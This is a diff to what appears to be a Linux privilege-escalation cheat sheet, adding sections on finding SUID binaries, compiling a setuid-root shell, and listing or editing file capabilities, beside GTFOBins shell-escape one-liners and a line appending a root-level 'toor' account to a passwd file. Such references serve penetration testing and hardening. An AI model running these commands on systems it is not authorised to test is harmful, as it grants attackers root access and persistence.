@@ -83,11 +83,61 @@
   * Checks to see if the host has Docker installed
   * Checks to determine if we're in an LXC container
 
+
+
+## SUID
+
+SUID/Setuid stands for "set user ID upon execution", it is enabled by default in every Linux distributions. If a file with this bit is ran, the uid will be changed by the owner one. If the file owner is `root`, the uid will be changed to `root` even if it was executed from user `bob`. SUID bit is represented by an `s`.
+
+```powershell
+╭─swissky@lab ~  
+╰─$ ls /usr/bin/sudo -alh                  
+-rwsr-xr-x 1 root root 138K 23 nov.  16:04 /usr/bin/sudo
+```
+
+### Find SUID binaries
+
+```bash
+find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
+```
+
+### Create a SUID binary
+
+```bash
+print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c   
+gcc -o /tmp/suid /tmp/suid.c  
+sudo chmod +x /tmp/suid # execute right
+sudo chmod +s /tmp/suid # setuid bit
+```
+
+
+## Capabilies
+
+List capabilities of binaries 
+```bash
+╭─swissky@crashmanjaro ~  
+╰─$ getcap -r  /usr/bin
+/usr/bin/fping                = cap_net_raw+ep
+/usr/bin/dumpcap              = cap_dac_override,cap_net_admin,cap_net_raw+eip
+/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
+/usr/bin/rlogin               = cap_net_bind_service+ep
+/usr/bin/ping                 = cap_net_raw+ep
+/usr/bin/rsh                  = cap_net_bind_service+ep
+/usr/bin/rcp                  = cap_net_bind_service+ep
+```
+
+Edit capabilites
+```powershell
+/sbin/setcap -r /bin/ping      # remove
+setcap cap_net_raw+p /bin/ping # add
+```
+
+
 ## GTFOBins
 
 [GTFOBins](https://gtfobins.github.io) is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.
 
-The project collects legitimate functions of Unix binaries that can be abused to get the f**k break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.
+The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.
 
 > gdb -nx -ex '!sh' -ex quit
 > sudo mysql -e '\! /bin/sh'
@@ -107,4 +157,4 @@ $> echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt
 
 ## References
 
-- []()
+- [SUID vs Capabilities - Dec 7, 2017 - Nick Void aka mn3m](https://mn3m.info/posts/suid-vs-capabilities/)
